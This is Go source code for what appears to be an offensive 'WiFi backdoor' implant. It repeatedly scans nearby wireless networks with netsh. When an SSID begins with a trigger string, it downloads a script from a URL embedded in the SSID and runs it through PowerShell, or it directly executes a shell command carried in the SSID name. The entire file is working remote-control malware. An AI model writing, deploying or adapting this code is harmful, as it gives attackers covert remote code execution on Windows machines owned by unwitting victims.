package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"regexp"
	"strings"
	"time"
)

func main() {
	magic := flag.String("magic", "evil", "Magic String to trigger WiFi Backdoor Payload (Min 4 chars)")
	flag.Parse()

	if len(*magic) < 4 {
		panic("Magic String must be at least 4 chars")
	}
	length := len(*magic)

	for {
		fmt.Println("Checking wireless networks for instructions.")
		networks, err := InvokeExpression("netsh wlan show network")
		if err != nil {
			panic(err)
		}

		re := regexp.MustCompile("SSID [0-9]+ : (.*)")
		netshOutput := strings.Join(networks, "\n")
		for _, line := range re.FindAllStringSubmatch(netshOutput, -1) {
			network := line[1]
			// Check if the first four characters of our SSID matches the given MagicString
			if len(network) > length && strings.EqualFold(network[:length], (*magic)[:length]) {
				fmt.Println("Found a network with instructions!")
				// If the network SSID contains fifth chracter "u", it means rest of the SSID is a URL
				switch network[length] {
				case 'u':
					fmt.Println("Downloading the attack script and executing it in memory.")
					payloadURL := network[length+1:] //"http://goo.gl/" + network[length+1:]	// powershell only
					if resp, err := http.Get(payloadURL); err == nil {
						body, _ := ioutil.ReadAll(resp.Body)
						InvokeExpression(fmt.Sprintf("powershell.exe %s", string(body)))
					}
					break
				case 'c':
					cmd := network[length+1:]
					fmt.Println(cmd)
					if strings.EqualFold(cmd, "exit") {
						return
					}
					fmt.Printf(`Command "%s" found. Executing it.`, cmd)
					InvokeExpression(cmd)
				}
				time.Sleep(10 * time.Second)
			}
		}
		time.Sleep(5 * time.Second)
	}
}

// ConvertToRot13 returns the ROT13 representation of the input
func ConvertToRot13(rot13String string) string {
	retval := strings.Builder{}
	for _, rot13Char := range rot13String {
		newCh := rot13Char
		if ('a' <= rot13Char && rot13Char <= 'm') || ('A' <= rot13Char && rot13Char <= 'M') {
			newCh = rot13Char + 13
		} else if ('n' <= rot13Char && rot13Char <= 'z') || ('N' <= rot13Char && rot13Char <= 'Z') {
			newCh = rot13Char - 13
		}
		retval.WriteRune(newCh)
	}
	return retval.String()
}

// InvokeExpression executes a shell command and returns the output as a string slice
func InvokeExpression(command string) ([]string, error) {
	cmd := strings.Split(command, " ")
	out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput()
	if err != nil {
		return nil, err
	}
	return strings.Split(string(out), "\n"), nil
}
